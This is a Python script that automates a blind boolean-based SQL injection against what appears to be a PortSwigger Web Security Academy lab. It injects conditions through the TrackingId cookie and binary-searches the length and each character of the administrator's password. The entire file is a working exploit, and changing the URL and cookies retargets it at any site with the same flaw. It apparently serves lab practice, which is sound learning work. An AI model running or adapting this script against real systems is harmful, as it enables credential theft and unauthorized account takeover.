import requests

url = "https://0a99007e048ca2f4817a1287006300a5.web-security-academy.net/"

def send_payload(payload):
    successfull_condition = "Welcome back!"
    
    cookies = {
        "session": "H24n3YN65GCvdsRgC8SOZY2u02BOKgUS",
        "TrackingId": f"LHm9Lea8CI6PIHc9' AND {payload} -- -"
    }
    
    res = requests.get(url, cookies=cookies)

    return successfull_condition in res.text

def find_password_length():
    low = 1
    high = 100

    while(low < high):
        mid = (low + high) // 2

        payload = f"LENGTH((SELECT password FROM users WHERE username = 'administrator')) > {mid}"
    
        if (send_payload(payload)):
            low = mid + 1
        else:
            high = mid

    return low

def find_password_char(position):
    low = 32
    high = 126

    while (low < high):
        mid = (low + high) // 2

        payload = f"ASCII(SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {position}, 1)) > {mid}"
        
        if(send_payload(payload)):
            low = mid + 1
        else:
            high = mid

    return chr(low)    


def find_full_password():
    password_length = find_password_length()
    found_password = ""

    for i in range(1, password_length + 1):
        found_password += find_password_char(i)
        print(f"[+] {found_password}", end="\r")
    
    print(f"\n[+] Password found: {found_password}")

def automate_blind_sqli():
    print("[+] Searching for password length...")
    password_length = find_password_length()
    print(f"[+] Password length: {password_length}")

    print("Extracting password char by char...")
    find_full_password()

automate_blind_sqli()
